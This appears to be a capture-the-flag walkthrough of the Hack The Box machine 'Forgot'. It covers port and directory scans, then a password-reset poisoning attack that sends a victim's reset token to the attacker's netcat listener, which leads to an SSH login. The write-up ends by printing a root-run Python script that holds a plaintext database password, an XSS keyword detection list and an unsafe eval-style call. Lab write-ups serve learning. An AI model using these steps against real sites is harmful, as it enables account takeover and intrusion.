```console
─$ nmap -A -p- -T4 -Pn 10.10.11.188
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-18 10:37 CST
Nmap scan report for 10.10.11.188
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 18 Nov 2022 16:38:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 2261458
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 18 Nov 2022 16:38:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 2261453
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 18 Nov 2022 16:38:10 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     X-Varnish: 721671
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
|_http-title: Login
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=11/18%Time=6377B4F4%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1E4,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.1\.2\x
SF:20Python/3\.8\.10\r\nDate:\x20Fri,\x2018\x20Nov\x202022\x2016:38:09\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x202261453\r\n
SF:Age:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:
SF:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirect
SF:ing\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x
SF:20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20h
SF:ref=\"http://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20
SF:click\x20the\x20link\.\n")%r(HTTPOptions,118,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Fri,\x2018\
SF:x20Nov\x202022\x2016:38:10\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x20
SF:0\r\nX-Varnish:\x20721671\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\(
SF:Varnish/6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r
SF:\n")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(F
SF:ourOhFourRequest,1C0,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20We
SF:rkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Fri,\x2018\x20Nov\x202022
SF:\x2016:38:15\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\n
SF:Content-Length:\x20207\r\nX-Varnish:\x202261458\r\nAge:\x200\r\nVia:\x2
SF:01\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<!d
SF:octype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\
SF:n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20fou
SF:nd\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20ma
SF:nually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.<
SF:/p>\n")%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.25 seconds
```
```console  
└─$ feroxbuster -u http://10.10.11.118 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt                              

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.118
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
Could not connect to http://10.10.11.118, skipping...
ERROR: Could not connect to any target provided
                                                                                                      
┌──(npayne㉿Nate-kali)-[~/Downloads]
└─$ feroxbuster -u http://10.10.11.188 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,git,pdf -q              
200      GET      246l      484w     5187c http://10.10.11.188/
200      GET      246l      484w     5189c http://10.10.11.188/login
302      GET        5l       22w      189c http://10.10.11.188/home => /
302      GET        5l       22w      189c http://10.10.11.188/tickets => /
200      GET      261l      517w     5523c http://10.10.11.188/reset
```

```
HTTP/1.1 503 Backend fetch failed
Date: Fri, 18 Nov 2022 17:32:50 GMT
Server: Varnish
Content-Type: text/html; charset=utf-8
Retry-After: 5
X-Varnish: 10389691
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Content-Length: 285
Connection: close

<!DOCTYPE html>
<html>
  <head>
    <title>503 Backend fetch failed</title>
  </head>
  <body>
    <h1>Error 503 Backend fetch failed</h1>
    <p>Backend fetch failed</p>
    <h3>Guru Meditation:</h3>
    <p>XID: 10389692</p>
    <hr>
    <p>Varnish cache server</p>
  </body>
</html>
```

found in source code mainthread>forgot.htb>(index)
<!-- Q1 release fix by robert-dev-14529 -->


```
GET /forgot?username=robert-dev-14529 HTTP/1.1
Host: 10.10.16.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.11.188/forgot
Cookie: __hstc=37486847.81557351f902e8b34a3e68fcf0b723ba.1668789518274.1668789518274.1668792249519.2; hubspotutk=81557351f902e8b34a3e68fcf0b723ba; __hssrc=1; __hssc=37486847.1.1668792249519
Content-Length: 0
```
```
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Fri, 18 Nov 2022 19:58:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 91
X-Varnish: 18596347
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close

Password reset link has been sent to user inbox. Please use the link to reset your password
```
```console
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.188] 60812
GET /reset?token=VYxb1JjIc0KpR6DgNCs2II%2BvdTZgtvGNP5G048Sh5nbf3rGmKbcuYbTa7JjrBHu8ZpLaI%2FTniylok%2FO3aeB%2B4A%3D%3D HTTP/1.1
Host: 10.10.16.12
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
```
POST /reset?token=VYxb1JjIc0KpR6DgNCs2II%2BvdTZgtvGNP5G048Sh5nbf3rGmKbcuYbTa7JjrBHu8ZpLaI%2FTniylok%2FO3aeB%2B4A%3D%3D HTTP/1.1
Host: 10.10.16.12:1234
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://10.10.11.188
Connection: close
Referer: http://10.10.11.188/reset
Cookie: __hstc=37486847.81557351f902e8b34a3e68fcf0b723ba.1668789518274.1668792249519.1668798425215.3; hubspotutk=81557351f902e8b34a3e68fcf0b723ba; __hssrc=1; __hssc=37486847.3.1668798425215

password=pass
```
```
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Fri, 18 Nov 2022 20:01:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7
X-Varnish: 18596498
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: close

Success
```

![image](https://user-images.githubusercontent.com/105310322/207165908-0858b1aa-657f-4cfd-bfe0-fdff3e94cbef.png)


Open a new private window and navigate to the webpage you specified in the link.

![image](https://user-images.githubusercontent.com/105310322/207165827-e73a6882-8862-40ca-a960-90086097994c.png)




![image](https://user-images.githubusercontent.com/105310322/207165880-4f1503bf-8ff8-4276-9d46-9602e11de7e9.png)


```console
└─$ ssh diego@10.10.11.188                                                                     
The authenticity of host '10.10.11.188 (10.10.11.188)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.188' (ED25519) to the list of known hosts.
diego@10.10.11.188's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-132-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 12 Dec 2022 10:11:52 PM UTC

  System load:  0.06              Processes:             221
  Usage of /:   65.3% of 8.72GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.10.11.188
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 18 10:51:30 2022 from 10.10.14.40
diego@forgot:~$ id
uid=1000(diego) gid=1000(diego) groups=1000(diego)

```

```console
diego@forgot:~$ cat user.txt
0916****************************
********************************
```

```console
diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```


```console
diego@forgot:~$ cat /opt/security/ml_security.py 
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        # add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        # add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        # add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        # add feature for length of the string
        feature5 = int(len(lowerStr))
        # add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        # add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        # add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        # append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()
```
